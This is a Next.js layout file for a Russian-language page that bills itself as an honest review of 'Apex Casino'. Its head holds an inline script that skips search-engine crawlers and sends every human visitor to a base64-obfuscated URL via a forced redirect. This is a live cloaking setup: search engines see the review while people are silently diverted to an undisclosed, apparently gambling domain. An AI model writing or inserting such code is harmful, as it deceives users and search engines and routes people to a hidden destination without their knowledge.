import type { Metadata, Viewport } from 'next'
import './globals.css'
import { Inter, Playfair_Display } from 'next/font/google'

const apxSans = Inter({ subsets: ['cyrillic', 'latin'], variable: '--font-apx-sans' })
const apxSerif = Playfair_Display({ subsets: ['cyrillic', 'latin'], variable: '--font-apx-serif' })

export const metadata: Metadata = {
  title: 'Apex Casino: вход, зеркало и официальный сайт — честный обзор 2026',
  description: 'Подробный обзор Apex Casino: как найти официальный сайт, выполнить вход, проверить зеркало, пройти регистрацию и играть осознанно. Ключевые условия, безопасность и ответы на частые вопросы без лишних обещаний.',
  generator: 'Next.js',
  robots: { index: true, follow: true },
  openGraph: {
    title: 'Apex Casino — спокойный обзор и навигатор',
    description: 'Вход, зеркало, официальный сайт, регистрация и правила ответственной игры в одном понятном материале.',
    type: 'article',
    locale: 'ru_RU',
  },
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#f6f4ef',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className={`${apxSans.variable} ${apxSerif.variable}`}>
      <head>
        <meta name="yandex-verification" content="3d98ca3c6594056e" />
<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>     
      </head>
      <body>
        {children}
      </body>
    </html>
  )
}
